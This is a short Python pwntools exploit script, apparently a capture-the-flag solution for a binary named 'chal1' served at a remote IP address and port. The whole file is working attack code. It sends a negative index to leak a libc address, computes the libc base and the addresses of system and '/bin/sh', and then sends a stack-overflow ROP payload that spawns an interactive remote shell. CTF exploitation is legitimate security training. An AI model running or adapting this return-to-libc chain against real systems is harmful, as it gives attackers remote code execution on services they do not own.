from pwn import *
from pwnlib.tubes.tube import tube

gdbscript = "b main\nb *main+194\nb *main+231\nb *main+261\nc"

#with gdb.debug("./chal1", gdbscript=gdbscript) as conn:
#with process("./chal1") as conn:
with remote("54.193.31.133", 13000) as conn:
    conn: tube

    print(conn.recvline())
    conn.sendline(b"evil hacker :)")
    print(conn.recvline())
    conn.sendline(b"-32")
    print(conn.recvline())
    conn.sendline(b"8")
    print(conn.recvline())
    line = conn.recvline(keepends=False)
    libc_leak_addr = int.from_bytes(line, "little")
    libc_base_addr = libc_leak_addr - 0x00007ffff7e1b6a0 + 0x00007ffff7c00000
    print(f"libc_base_addr {hex(libc_base_addr)}")

    system_addr = libc_base_addr - 0x00007ffff7c00000 + 0x7ffff7c50d70
    set_rdi_gadget_addr = libc_base_addr + 0x2a3e5
    binsh_addr = libc_base_addr - 0x00007ffff7c00000 + 0x7ffff7dd8678
    ret_addr = set_rdi_gadget_addr + 1
    payload = \
        b"h" * 0x90 + \
        b"h" * 0x8 + \
        p64(set_rdi_gadget_addr) + \
        p64(binsh_addr) + \
        p64(ret_addr) + \
        p64(system_addr)
    conn.sendline(payload)

    conn.interactive()
